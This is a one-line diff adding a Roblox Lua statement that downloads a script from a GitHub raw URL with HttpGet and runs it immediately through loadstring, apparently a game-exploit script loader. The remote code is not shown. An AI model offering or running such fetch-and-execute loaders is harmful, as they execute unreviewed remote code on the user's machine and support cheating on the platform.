@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnPro132/Ultip/main/Pro",true))()
